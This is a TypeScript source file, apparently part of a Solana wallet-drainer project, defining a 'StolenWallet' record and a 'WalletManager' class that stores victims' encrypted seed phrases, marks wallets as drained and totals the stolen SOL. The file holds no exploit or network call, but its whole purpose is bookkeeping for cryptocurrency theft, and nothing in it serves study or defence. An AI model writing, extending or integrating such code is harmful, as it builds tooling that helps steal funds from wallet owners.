import { encrypt } from '../utils/encryption';

export interface StolenWallet {
  seedPhrase: string; // encrypted
  publicKey: string;
  balance: number;
  drained: boolean;
  timestamp: number;
}

export class WalletManager {
  private stolenWallets: StolenWallet[] = [];

  addStolenWallet(seedPhrase: string, publicKey: string, balance: number): void {
    this.stolenWallets.push({
      seedPhrase: encrypt(seedPhrase),
      publicKey: publicKey,
      balance: balance,
      drained: true,
      timestamp: Date.now()
    });
  }

  getStats(): { totalDrained: number; totalSol: number; wallets: any[] } {
    return {
      totalDrained: this.stolenWallets.length,
      totalSol: this.stolenWallets.reduce((sum, w) => sum + w.balance, 0),
      wallets: this.stolenWallets.map(w => ({
        publicKey: w.publicKey,
        balance: w.balance,
        timestamp: w.timestamp
      }))
    };
  }
}